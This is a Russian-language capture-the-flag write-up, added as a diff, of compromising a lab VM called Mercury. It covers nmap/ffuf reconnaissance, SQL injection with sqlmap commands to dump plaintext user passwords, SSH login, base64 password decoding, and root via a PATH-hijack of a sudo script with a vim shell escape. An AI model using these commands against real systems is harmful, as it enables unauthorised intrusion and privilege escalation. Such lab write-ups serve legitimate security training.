@@ -1,0 +1,126 @@
+РАЗВЕДКА:
+	С помощью утилиты netdiscover я выяснил все ip адреса в моей сети. Проанализировав результаты 
+(ScreenShots/ipaddress.png), я выяснил IP АДРЕС ЦЕЛИ: 10.0.2.11
+
+СКАНИРОВАНИЕ:
+	Сканирование я начал со сканирования портов. Для этонго использовал инструмент nmap. Использовал команду:
+		sudo nmap -sV -vvv -p- -O -oA FirstNmapScan 10.0.2.11
+	Результаты сканирования (Scans/FirstNmapScan.*):
+		1) MAC адрес: 08:00:27:2C:DF:14 (Oracle VirtualBox virtual NIC)
+		2) ОС на цели: Linux 4.15 - 5.8, Ubuntu
+		3) Открытые порты: 
+			1. 22/tcp ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+			2. 8080/tcp http-proxy WSGIServer/0.2 CPython/3.8.2:
+				На этом порту расположен сайт (ScreenShots/site.png), никаких полезных данных он не 
+				несет. Исходный код никаких полезных данных не предоставляет (site_code.png). Файл 		                	robots.txt никаких полезных данных не предоставляет (robots_txt.png). Запрещенная для 					индексирования директория "/" -- наша исходная точка.
+
+	Приступаю к сканированию с помощью инструмента ffuf.
+	Моя первая попытка (Scans/FirstFfufScam.html):
+	Запросы:
+		ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 				http://10.0.2.11:8080/FUZZ -o FirstFfufScan.html -of html -v -t 100
+	Результат: ДИРЕКТОРИИ НЕ НАЙДЕНЫ
+
+	Повзаимедействовав с URL, я нашел страницу 404 (ScreenShots/page404.png):
+	Вот что я извлек:
+		1) Сервер написан с помощью Django, а значит резкльтатам сканирования nmap можно доверять;
+		2) Я нашел директорию mercuryfacts/ , на которой расположена страница (ScreenShots/mercuryfacts.png);
+		3) Есть специальный файл "mercury_proj.urls", который содержит настройки и если вводимые данные не			 соответствуют 'index' или robots.txt 'robots' или  mercuryfacts/ , отладка не происходит и появляется 			наша страница.
+	Продолжаю взаимодействовать с URL строкой. 'http://10.0.2.11:8080/mercuryfacts/robots.txt/' показал следующий	       результат результат (ScreenShots/mercury_facts_robots.png). Выводы:
+			1. На сервере работает MySql база данных;
+			2. На сервере установлен python3;
+
+ПОЛУЧЕНИЕ ДОСТУПА:
+	Сервер уязвим к SQLi (sqli.png). Пробую получить данные через SQLi.
+	Вместе с ошибкой выдается запрос к БД и имя пользователя (ScreenShots/user_and_request.png).
+	При запросе "id" я получил всю базу данных.
+	После нескольких попыток я не получил более объемных результатов. Поэтому буду использовать sqlmap.
+	
+	Мой первый запрос: sqlmap -u http://10.0.2.11:8080/mercuryfacts/ --dbs
+	Результаты запроса (ScreenShots/sqlmap1.png):
+		1. URI parameter '#1*' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replace' injectable
+		2. URI parameter '#1*' is 'MySQL UNION query (random number) - 1 to 20 columns' injectable
+		3. available databases [2]:
+			[*] information_schema
+			[*] mercury
+	Очевидно, что нужная мне база данных -- mercury. Делаю запрос к ней.
+
+	Второй запрос: sqlmap -u http://10.0.2.11:8080/mercuryfacts/ -D mercury --tables
+	Результаты запроса (ScreenShots/sqlmap2.png):
+		1. Database: mercury
+	        	[2 tables]
+			+-------+
+			| facts |
+			| users |
+			+-------+
+
+	Мне нужны двнные пользователей, поэтомо обращаюсь к таблице "users".
+	
+	Третий запрос: sqlmap -u http://10.0.2.11:8080/mercuryfacts/ -D mercury -T users --columns
+	Результаты запроса (ScreenShots/sqlmap3.png): 
+		Database: mercury
+		Table: users
+		[3 columns]
+		+----------+-------------+
+		| Column   | Type        |
+		+----------+-------------+
+		| id       | int         |
+		| password | varchar(50) |
+		| username | varchar(50) |
+		+----------+-------------+
+
+	И вот я знвю, как выглядит база данных пользователей изнутри. У меня есть предполагаемое имя пользователя, 
+	нужен лишь пароль.
+		
+	Четвертый звпрос: sqlmap -u http://10.0.2.11:8080/mercuryfacts/ -D mercury -T users --dump
+	Результаты запроса (ScreenShots/sqlmap4.png):
+		Database: mercury
+		Table: users
+		[4 entries]
+		+----+-------------------------------+-----------+
+		| id | password                      | username  |
+		+----+-------------------------------+-----------+
+		| 1  | johnny1987                    | john      |
+		| 2  | lovemykids111                 | laura     |
+		| 3  | lovemybeer111                 | sam       |
+		| 4  | mercuryisthesizeof0.056Earths | webmaster |
+		+----+-------------------------------+-----------+
+	
+
+ЗАКРЕПЛЕНИЕ В СИСТЕМЕ:
+	Для входа в систему использую ssh. Использую логин: webmaster -- пароль: mercuryisthesizeof0.056Earths.
+	Данные правильные -- я в системе (ScreenShots/login.png)
+	
+	В пользовательской директории находился первый флаг (ScreenShots/user_flag.png)
+	Я скачал его следующим образом (Results/user_flag.txt): 
+		жертва -- сервер (sreenShots/server.png)
+		злоумышленник -- клиент (ScreenShots/client.png)
+	Флаг: [user_flag_8339915c9a454657bd60ee58776f4ccd]
+
+	Перехожу к повышению привелегий.
+
+ПОВЫШЕНИЕ ПРИВЕЛЕГИЙ:
+WEBMASTER:
+	История и файл .bash_history пустые (ScreenShots/history.png).
+	Версия ядра: 5.4.0-45-generic
+	webmaster не может выполнять команду sudo (ScreenShots/sudo.png).
+	webmaster может читать и скачать файл /etc/passwd (ScreenShots/passwd.png) -- ОПАСНО!!!
+	Доступ к ssh имеют 3 пользователя (ScreenShots/users.png).
+	
+	В домашней директории webmaster находится директория "mercury_proj". Перехожу к иследованию этой директории.
+	Здесь есть файл notes.txt (Results/notes.txt). В этом файле находятся  данные от двух аккаунтов: webmaster  и linuxmaster. Пароли зашифрованы с помощью base64. Расшифрую пароль linuxmaster с помощью команды 'echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" | base64 -d' и перейду к пользователю linuxmaster -- mercurymeandiameteris4880km.
+
+LINUXMASTER:
+	История и файл .bash_history пустые.
+	Пользователь может установить среду без sudo: SETENV: /usr/bin/check_syslog.sh
+	Владельцем файла /usr/bin/check_syslog.sh является root, не могу в него записывать данные.
+	Я связываю редактор vim и команду tail c помощью команды ln -s /bin/vim tail. Далее обновляю PATH c помощью     	команды export PATH=.:$PATH . Запускаю файл с помощью команды:
+	 sudo --preserve-env=PATH /usr/bin/check_syslog.sh
+	Далее ввожу команду: !/bin/sh -- получаю root (ScreenShots/root.png).
+
+	В директории /root был второй флаг, скачиваю его (Results/root_flag.txt).
+	Флаг: [root_flag_69426d9fda579afbffd9c2d47ca31d90]
+
+УДАЛЕНИЕ СЛЕДОВ:
+	НЕ ТРЕБУЕТСЯ. НИЧЕГО НЕ ВНОСИЛ.
+
+ПОДГОТОВКА ОТЧЕТА:
